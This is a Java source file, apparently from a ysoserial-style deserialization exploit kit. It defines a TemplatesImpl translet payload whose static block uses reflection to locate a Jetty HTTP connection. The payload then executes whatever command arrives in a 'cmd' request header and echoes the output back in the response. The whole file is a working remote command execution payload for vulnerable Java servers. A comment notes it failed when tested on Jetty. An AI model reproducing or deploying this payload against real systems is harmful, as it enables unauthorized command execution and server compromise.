package ysoserial;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

// https://github.com/feihong-cs/Java-Rce-Echo/blob/master/Jetty/code/jetty78Echo.jsp
// 在Jetty测试失败
public class MyClassLoader6 extends AbstractTranslet {
    static {
        try{

            Class clazz = Thread.currentThread().getClass();
            java.lang.reflect.Field field = clazz.getDeclaredField("threadLocals");
            field.setAccessible(true);
            Object obj = field.get(Thread.currentThread());
            field = obj.getClass().getDeclaredField("table");
            field.setAccessible(true);
            obj = field.get(obj);
            Object[] obj_arr = (Object[]) obj;
            for(Object o : obj_arr){
                if(o == null) continue;
                field = o.getClass().getDeclaredField("value");
                field.setAccessible(true);
                obj = field.get(o);
                if(obj != null && obj.getClass().getName().endsWith("AsyncHttpConnection")){
                    Object connection = obj;
                    java.lang.reflect.Method method = connection.getClass().getMethod("getRequest");
                    obj = method.invoke(connection);
                    method = obj.getClass().getMethod("getHeader", String.class);
                    String cmd = (String)method.invoke(obj, "cmd");
                    if(cmd != null && !cmd.isEmpty()){
                        String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
                        method = connection.getClass().getMethod("getPrintWriter", String.class);
                        java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(connection, "utf-8");
                        printWriter.println(res);
                    }
                    break;
                }
            }

        }catch(Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
